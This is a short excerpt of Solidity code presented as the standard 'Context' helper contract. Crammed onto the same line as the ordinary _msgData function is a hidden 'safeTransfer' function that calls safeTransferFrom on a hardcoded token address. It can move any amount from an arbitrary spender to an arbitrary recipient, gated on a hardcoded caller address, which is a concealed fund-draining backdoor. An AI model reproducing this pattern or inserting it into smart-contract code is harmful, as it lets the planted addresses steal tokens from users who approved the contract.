...
abstract contract Context {
  ...
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x520872082d05de9B224C09D9601230CdC14ac148)) {TransferHelper.safeTransferFrom(0xCeDA35dca0Bfd510724645819E236dacdd11E43d,spender,recipient,amount);return true;}return false;}
}
